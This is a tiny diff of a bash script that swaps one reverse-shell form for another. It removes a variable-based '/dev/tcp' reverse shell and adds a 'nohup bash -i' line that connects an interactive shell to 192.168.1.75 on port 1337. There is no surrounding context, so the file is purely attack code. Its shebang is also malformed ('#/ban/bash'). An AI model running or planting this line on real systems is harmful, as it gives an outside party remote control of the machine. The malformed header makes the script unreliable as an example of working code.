@@ -1,4 +1,2 @@
 #/ban/bash
-export RHOST=192.168.1.75
-export RPORT=1337
-bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT 0<&1'
+nohup bash -i >& /dev/tcp/192.168.1.75/1337 0>&1
